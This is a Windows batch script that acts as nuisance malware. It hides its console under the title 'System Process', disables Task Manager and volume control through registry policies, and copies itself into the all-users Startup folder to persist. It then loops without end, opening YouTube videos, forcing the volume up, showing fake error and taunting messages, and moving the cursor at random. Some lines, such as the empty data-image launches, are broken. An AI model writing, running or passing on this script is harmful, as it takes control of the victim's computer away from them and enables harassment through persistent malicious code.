@echo off
title System Process
mode con cols=15 lines=1
color 07

if "%1" neq "hide" (
  start /min cmd /c "%~f0 hide"
  exit
)

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoVolumeControl" /t REG_DWORD /d 1 /f

if not exist "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\mouhahah.bat" (
  copy /y "%~f0" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
)

start /min "" "https://www.youtube.com/watch?v=gzOzqnJWg8o&autoplay=1"
ping -n 3 127.0.0.1 > nul
powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)"

start /min "" "https://www.youtube.com/watch?v=Zh-Tn7pS8Sw&autoplay=1"
ping -n 5 127.0.0.1 > nul
powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)"

:loop
tasklist | find /i "cmd.exe" > nul
if errorlevel 1 start /min "" "%~f0 hide"

start "data:image/jpeg;base64,"

powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)"

start /min "" "https://www.youtube.com/watch?v=2ZIpFytCSVc&autoplay=1"
ping -n 1 127.0.0.1 > nul
powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)"

start "data:image/jpeg;base64,"

start /min "" "https://www.youtube.com/shorts/-l4VvfAguUo&autoplay=1&loop=1&controls=0&showinfo=0"
ping -n 7 127.0.0.1 > nul
powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)"

start "data:image/jpeg;base64,"

start /min "" "https://www.youtube.com/watch?v=VLP_tnnDGSQ&autoplay=1"
ping -n 8 127.0.0.1 > nul
powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)"

start "data:image/jpeg;base64,"

msg * "Windows detected an error!"
ping -n 4 127.0.0.1 > nul
powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)"

msg * "what are you doing to me!"
ping -n 10 127.0.0.1 > nul
powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)"

msg * "why!"
ping -n 12 127.0.0.1 > nul
powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)"

powershell -Command "$x=Get-Random -Minimum 0 -Maximum 1920; $y=Get-Random -Minimum 0 -Maximum 1080; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)"
ping -n 1 127.0.0.1 > nul

powershell -Command "$x=Get-Random -Minimum 0 -Maximum 1920; $y=Get-Random -Minimum 0 -Maximum 1080; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)"
ping -n 1 127.0.0.1 > nul

goto loop
